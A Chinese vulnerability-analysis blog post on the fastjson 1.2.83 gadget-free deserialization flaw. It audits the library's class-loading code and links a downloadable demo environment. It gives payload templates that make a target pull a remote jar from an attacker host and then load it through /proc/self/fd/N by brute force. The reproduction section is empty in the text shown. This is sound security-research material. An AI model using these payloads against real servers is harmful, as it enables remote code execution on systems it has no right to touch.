---
title: fastjson-1.2.83反序列化漏洞
published: 2026-08-20
description: 最近比较热乎的一个漏洞，但没有想象中那么致命
tags: [fastjson,框架漏洞, nday, 反序列化, 代码审计]
category: 漏洞复现
draft: false
---



# 漏洞描述

漏洞源于 Fastjson 反序列化流程中的一处安全缺陷。在使用默认配置（未开启 SafeMode）的情况下，若攻击者能够控制传递给 Fastjson 的 JSON 数据，即可利用 Fastjson 自身内部的反序列化逻辑构造恶意载荷，无需目标环境存在特定 gadget 类便能触发任意代码执行。由于该漏洞属于"gadget-free"利用方式，传统的移除危险类等缓解手段对此无效。

据网传所说，仅需jdk8+springboot fatjar启动即可达到利用条件，可现实中当真如此吗？

# 利用条件

- fastjson版本<=1.2.83
- fastjson的SafeMode未开启
- java版本：jdk8
- 目标必须出网
- 类加载器支持加载URL资源

# 演示环境

演示环境下载地址：https://pan.baidu.com/s/1SMFWcRSoVwFK8I4LinOq2w?pwd=1145

启动命令：**java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar range-app-1.0.0.jar --server.port=18088**

# 源码分析

我们重点审计`ParserConfig`类的`checkAutoType`方法的第1479-1503行的代码。`typeName`是@type字段的值、并且是字符串类型，在1502行中使用了`TypeUtils`工具类的`loadClass`方法来将@type字段的值指向的对象加载到jvm中，不过想走到这行首先得满足if的条件。

`autoTypeSupport`的值在fastjson1.2.83版本中默认是false，`expectClassFlag`的值在sink点为`JSON.parseObject(str)` 的场景下也默认为false（具体看传给checkAutoType的expectClass参数的值是什么，这里不详细展开讲，具体可看1342行附近的内容）,这里的重点在于jsonType的值，如何才能为true进入该if分支。

jsonType的值初始是false。关键在"资源探测"这一步：将typeName里的 . 替换成 / 并且在末尾拼接上 .class 后将结果赋给resource，然后调用`getResourceAsStream(resource)`去取这个资源，若类的字节里带着 `@JSONType` 注解，`jsonType` 就改为 `true`。

defaultClassLoader是ParserConfig单例的一个属性，如果没有人为去修改默认为null，因此会走到else分支，使用的类加载器为ParserConfig.class.getClassLoader()的值，即加载了fastjson组件的类加载器。若是springboot fatjar启动，则该类加载器为`LaunchedURLClassLoader`，它继承自 `URLClassLoader`，在 **JDK8** 下，其底层 `URLClassPath` 会把形如 `jar:http://...` 的资源名当作 **jar: URL** 解析（`JarURLConnection`），从而真的发起 HTTP 下载——这正是探测阶段能"远程拉 jar"、也是该利用必须springboot FatJar + JDK8 的根本原因。

```java showLineNumbers startLineNumber=1479 title="ParserConfig.java"
        boolean jsonType = false;
        InputStream is = null;
        try {
            String resource = typeName.replace('.', '/') + ".class";
            if (defaultClassLoader != null) {
                is = defaultClassLoader.getResourceAsStream(resource);
            } else {
                is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
            }
            if (is != null) {
                ClassReader classReader = new ClassReader(is, true);
                TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
                classReader.accept(visitor);
                jsonType = visitor.hasJsonType();
            }
        } catch (Exception e) {
            // skip
        } finally {
            IOUtils.close(is);
        }

        if (autoTypeSupport || jsonType || expectClassFlag) {
            boolean cacheClass = autoTypeSupport || jsonType;
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
        }
```

接下来对TypeUtils工具类的loadClass方法进行审计，重点看1771-1780行的内容。className就是loadClass传过来的typeName、依旧是@type字段的值。

在这里获取类加载器使用的是`Thread.currentThread().getContextClassLoader()`方法，这个方法获取的是当前线程上下文类加载器，问题就出在这里，若是内嵌tomcat的springboot，则在此处获取到的类加载器是`TomcatEmbeddedWebappClassLoader`。

而问题也出在这个类加载器上。虽然`TomcatEmbeddedWebappClassLoader`同为 `URLClassLoader` 子类，但如果className含有连续的斜杠(如 // ) ，则TomcatEmbeddedWebappClassLoader不会去加载这个远程类。

```java showLineNumbers startLineNumber=1771 title="TypeUtils.java"
        try {
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
            if (contextClassLoader != null && contextClassLoader != classLoader) {
                clazz = contextClassLoader.loadClass(className);
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch (Throwable e) {
```

而在Linux上，存在绕过这个限制的方法(Windows暂无有效方法)。首先发送 `{"@type":"jar:http:..<十进制IP>:<端口>.probe!.POC","x":1}`。探测阶段的 `getResourceAsStream` 走的是资源侧，不受` TomcatEmbeddedWebappClassLoader` 的限制，目标会把远程 jar 拉下来，并被自己的类加载器缓存成一个本地临时文件——这个文件已被标记"删除"，但**文件描述符还开着**，挂在 `/proc/self/fd/N` 上（N 是操作系统分配的编号，事先不知道因此需要爆破）。

既然 jar 已经躺在目标本地的某个 fd 上，就把类名换成 `jar:file:/proc/self/fd/N!/POC`。关键在**单斜杠**：它没有 `jar:http://` 那种 `//`，能通过TomcatEmbeddedWebappClassLoader的检测，放行，接着static块代码执行。由于 fd 编号未知，需要进行爆破。



# 漏洞复现
